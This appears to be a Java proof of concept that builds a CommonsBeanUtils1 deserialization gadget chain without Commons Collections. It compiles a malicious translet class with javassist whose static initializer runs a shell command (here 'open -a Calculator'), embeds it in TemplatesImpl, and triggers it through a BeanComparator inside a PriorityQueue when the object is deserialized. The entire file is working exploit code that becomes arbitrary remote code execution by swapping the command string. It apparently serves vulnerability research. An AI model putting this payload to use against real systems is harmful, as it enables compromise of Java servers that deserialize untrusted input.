package CommonsBeanUtils1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/11 4:49 下午
 */
public class CommonsBeanUtilsWithoutCC {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void CB() throws Exception {

        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("CBEvilWithoutCC");
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        ctClass.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");");

        byte[] bytes = ctClass.toBytecode();
        byte[][] targetBytes = new byte[][]{bytes};

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "h3rmesk1t");
        setFieldValue(templates, "_bytecodes", targetBytes);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        Class c  = Class.forName("java.lang.String$CaseInsensitiveComparator");
        Constructor constructor = c.getDeclaredConstructor();
        constructor.setAccessible(true);
        Comparator comparator = (Comparator<?>) constructor.newInstance();

        BeanComparator beanComparator = new BeanComparator(null, comparator);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(1);
        queue.add(2);

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        try {
            // 序列化操作
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CBEvilWithoutCC.bin"));
            outputStream.writeObject(queue);
            outputStream.close();
            // 反序列化操作
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CBEvilWithoutCC.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {

        CB();
    }
}
